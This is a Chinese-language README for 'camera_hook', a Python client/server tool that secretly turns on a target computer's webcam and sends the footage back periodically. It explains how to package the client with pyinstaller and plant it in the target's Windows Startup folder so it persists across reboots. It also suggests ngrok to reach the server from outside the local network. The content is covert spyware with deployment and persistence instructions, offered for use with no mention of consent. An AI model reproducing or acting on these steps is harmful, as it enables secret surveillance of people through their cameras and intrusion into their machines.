# camera_hook
摄像头钩子程序，自动打开目标主机摄像头并回传信息，此外，还会根据平台选择最佳的IO多路复用机制

# 环境
python3

# 依赖模块
opencv-python
- 装有pip工具的同学可以：pip install opencv-python
- 没装有pip工具的同学请移步https://pypi.org/project/opencv-python/ 手动下载

# 使用
1.测试使用，不打包，直接运行python脚本（有python环境），先运行server.py，再运行client.py。client.py会把摄像头的内容每隔一段时间传给server.py
2.正式使用，利用pyinstaller工具先将server.py、client.py分别打包（不依赖python环境），然后将client.py打包的成的可执行文件，加入到目标机器的开机启动项中：C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup，然后本机运行服务器就可以了

# 注意
一般玩家只能在局域网中使用本程序，原因是服务器没有公网ip，但可以使用ngork内网穿透工具，将内网端口映射到外网，而且是免费哒，enjoy~
